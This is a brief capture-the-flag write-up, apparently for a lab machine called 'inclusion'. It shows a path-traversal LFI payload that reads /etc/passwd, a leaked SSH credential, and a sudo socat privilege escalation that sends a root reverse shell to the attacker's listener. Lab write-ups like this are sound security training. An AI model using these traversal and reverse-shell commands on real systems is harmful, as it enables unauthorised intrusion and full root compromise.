```bash
export IP=10.10.2.219
```

# Nmap

Ports 22 and 80 are open

# Lfi

Lfi with 0-filtration
```
http://$IP/article?name=../../../../../etc/passwd
```

We have a string here:
```
#falconfeast:rootpassword
```

# SSH

```bash
ssh falconfeast@$IP
```

```bash
sudo -l
User falconfeast may run the following commands on inclusion:
    (root) NOPASSWD: /usr/bin/socat
```

# Socat

That's an interesting part

### GTFOBins:
https://gtfobins.github.io/
Just to check what I can do with socat

My machine: 

```bash
socat file:`tty`,raw,echo=0 tcp-listen:12345
```

On falconfeast@$IP:

```bash
RHOST=<My IP>
RPORT=12345
sudo /usr/bin/socat tcp-connect:$RHOST:$RPORT exec:sh,pty,stderr,setsid,sigint,sane
```
Then I just went to /root and there was a file `root.txt`